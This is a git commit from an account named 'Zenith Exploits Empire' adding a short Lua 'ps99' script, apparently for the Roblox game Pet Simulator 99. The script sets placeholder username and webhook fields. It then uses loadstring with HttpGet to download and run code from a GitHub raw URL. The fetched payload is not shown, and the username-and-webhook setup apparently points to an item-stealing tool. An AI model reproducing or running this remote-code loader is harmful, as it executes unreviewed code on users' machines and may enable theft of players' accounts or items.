2fcd1681f7b1c8028319c39d0f1942590cdb2a6c
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-19 23:10:31 +0200

    Added ps99 script: arshan123

---
+++ test/arshan123.lua
@@ -0,0 +1,5 @@
+Username = "test"
+Username2 = "test"
+Webhook = "test"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
